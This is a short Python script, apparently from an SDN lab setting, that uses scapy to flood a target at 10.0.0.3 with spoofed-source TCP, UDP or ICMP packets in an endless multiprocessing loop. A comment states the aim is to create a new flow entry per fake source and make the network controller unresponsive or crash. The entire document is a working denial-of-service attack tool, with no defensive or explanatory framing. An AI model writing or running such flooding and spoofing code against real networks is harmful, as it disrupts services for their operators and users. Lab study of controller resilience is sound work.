import sys, random
from scapy.all import *
import multiprocessing

destinations = ["10.0.0.3"]
sources = ["10.0.0.1", "10.0.0.2", "10.0.0.4"] * 10000


# Random IPs => new flow entry for each one, resulting in controller unresponsiveness / crashing
def get_random_ips(n):
    for i in range(0, int(n)):
        ip_gen = (
            str(random.randint(0, 255))
            + "."
            + str(random.randint(0, 255))
            + "."
            + str(random.randint(0, 255))
            + "."
            + str(random.randint(0, 255))
        )
        sources.append(ip_gen)


def send_rand_tcp(src_ip):
    dst_ip = random.choice(destinations)
    send(IP(src=src_ip, dst=dst_ip) / TCP(sport=RandShort()))


def send_rand_udp(src_ip):
    dst_ip = random.choice(destinations)
    send(IP(src=src_ip, dst=dst_ip) / UDP(sport=RandShort()))


def send_rand_icmp(src_ip):
    dst_ip = random.choice(destinations)
    send(IP(src=src_ip, dst=dst_ip) / ICMP(type="echo-request") / Raw(load="A" * 1024))


if __name__ == "__main__":
    while True:
        p = multiprocessing.Pool(3)
        p.apply_async(send_rand_tcp, args=(sources,))  # uncomment for tcp packets
        # p.apply_async(send_rand_udp, args=(sources,))     # uncomment for udp packets
        # p.apply_async(send_rand_icmp, args=(sources,))    # uncomment for icmp packet
        p.close()
        p.join()
